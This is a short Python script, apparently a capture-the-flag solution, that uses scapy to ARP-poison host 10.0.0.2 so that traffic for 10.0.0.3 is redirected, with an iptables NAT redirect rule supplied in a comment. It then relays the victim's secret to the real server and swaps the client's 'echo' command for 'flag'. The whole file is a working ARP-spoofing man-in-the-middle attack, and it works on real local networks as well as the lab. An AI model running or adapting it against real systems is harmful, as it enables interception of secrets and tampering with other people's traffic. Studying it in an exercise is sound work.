import time
import socket, threading
from scapy.all import *

# Need to "listen" for traffic destined to 10.0.0.3. Do this with:
# iptables -t nat -A PREROUTING -i eth0 -p tcp -d 10.0.0.3 --dport 31337 -j REDIRECT --to-port 31337

# find MAC address using `ip addr show`
MAC = '...'

ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.2"), iface="eth0", timeout=2, verbose=False)
mac_2 = ans[0][1][ARP].hwsrc

def arp_poison():
    # poison where 10.0.0.2 thinks that 10.0.0.3 is located
    while True:
        arp_pkt = Ether(dst=mac_2)/ARP(hwsrc=MAC, psrc='10.0.0.3', pdst='10.0.0.2', op=2)
        sendp(arp_pkt, verbose=False)
        time.sleep(1)

def mitm():
    client_socket = socket.socket()
    client_socket.connect(('10.0.0.3',31337))
    print('connection completed')
    client_socket.settimeout(20)
    r1 = client_socket.recv(1024)
    assert r1 == b'secret: '
    print('secret assertion successful')
    time.sleep(1)

    server_socket = socket.socket()
    server_socket.bind(('0.0.0.0', 31337))
    server_socket.listen()
    connection, _ = server_socket.accept()
    time.sleep(1)
    print('connection1 completed')
    connection.sendall(r1)
    print('"secret" command sent')

    time.sleep(1)

    secret = bytes.fromhex(connection.recv(1024).decode())
    print('secret:', secret)

    client_socket.sendall(secret.hex().encode())
    print('secret sent')
    client_socket.settimeout(20)

    r2 = client_socket.recv(1024)
    assert r2 == b'command: '
    print('command assertion successful')

    connection.sendall(r2)
    print(' "command" intruction sent')

    command = connection.recv(1024).decode().strip()
    print(command)
    assert command=='echo'
    print('"command (echo)" instruction received')
    client_socket.sendall(b'flag')
    time.sleep(1)
    resp = client_socket.recv(1024) # flag expected here
    print(resp)

t = threading.Thread(target=arp_poison)
t.start()
mitm()
t.join()
